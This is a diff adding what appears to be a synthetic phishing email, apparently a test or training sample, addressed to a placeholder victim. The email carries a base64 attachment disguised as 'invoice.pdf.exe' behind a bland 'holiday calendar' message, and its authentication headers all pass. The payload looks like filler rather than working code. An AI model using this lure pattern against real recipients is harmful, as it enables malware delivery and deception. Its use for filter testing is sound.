@@ -1,0 +1,46 @@
+From: notice@pay-ap.top
+To: victim36@example.com
+Subject: Updated holiday calendar [ref ACD1CE4]
+Date: Tue, 26 Mar 2002 23:57:00 -0500
+Message-ID: <phish-36-9177a407-d2bf-48ae-b73d-8e55373fa832@pay-ap.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 24 Mar 2002 02:14:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 21 Mar 2002 11:27:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 20 Mar 2002 20:32:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 08 Mar 2002 23:47:00 -0500
+Return-Path: <notice@pay-ap.top>
+Reply-To: notice@pay-ap.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=pay-ap.top; dkim=pass header.d=pay-ap.top; dmarc=pass header.from=pay-ap.top
+Received-SPF: pass (mx.example.com: domain of notice@pay-ap.top designates 192.0.2.56 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=pay-ap.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-36-83946847"
+
+--bnd-p-36-83946847
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: ACD1CE4
+
+Thanks,
+Colleague
+--bnd-p-36-83946847
+Content-Type: application/octet-stream; name="invoice.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="invoice.pdf.exe"
+
+TVqQAF2EoyBBq5cKZ9Mcx1Lup3X6vYYBuTkiJ2s23U4aWxNpOwjWzO3x1BRtQdac5WH6IxWLoOGP
+CxoD/msccCPSEdNBYOh7/UzHM8WbfEZ0aTkFN3zk5Z/07K+5/12+mB3R/ZgTXEMyIwzKuw3Mu3ZA
+9vT8q9Cwe0RR66WDaa/gnmRoT1YplxQ0nHMFhiGj6/n53hTDCqdQPo/RICfp4u+IJNRQIBG0cBf8
+BPbu71ePYby+9QOfcqF8VyRcPOgMWuz8SvXH7tl8Hfu8bJF3V+jTrFJ1HI6U/euH+90iz5x9ALQm
+urOY3TYLiRQCMhm5oJmaHr1PIJYh5z5VgSY1iSgnsKiWlMqSazYuuQZN1gKuOOosHmR+SQvwzhZ+
+xinjaDSpjHSsmIP7d5Mgpgd1/9hE9hZO4SGcf4EB3urqXo7baOMkR6Dlg7t9qk3tSNUQ+zAx030d
+d4eAgTpRPYK+uBWwVHZHYWuVoQDoM/KE6GOumX3Hzo9lizTT9jxYG+mFmKBM5MqSxKSITiBC0rPX
+q7GNPaK4/f9FvH4XJJDWHWffphDTQgkCkziybpbl88nHq1Cec7rmG55/+ZS1MFUKt/QF897U1U4i
+FD7FR7xT3uLAIZqP/8McBGQSApoHDwb8Gv9mBBpVDin+bo1oVFnKg3J3N7hXmJZBfOprOnCUMGUK
+xH1pgtkZpeor4iIWo5sWU0B3BhhFLmScnAvWXT4AAUKidAvJVGwbpKXhdw9CK2oOl40XXjJJPHD1
+X5Lkzbgi3OapDB+W79JClZ4s8T67ozl8vQgrwQXyc9IM3c5yQ3yACI/4aJjFYc5MIFNLxi4efAqB
+q+wM+ClikibAocf5cw==
+
+--bnd-p-36-83946847--
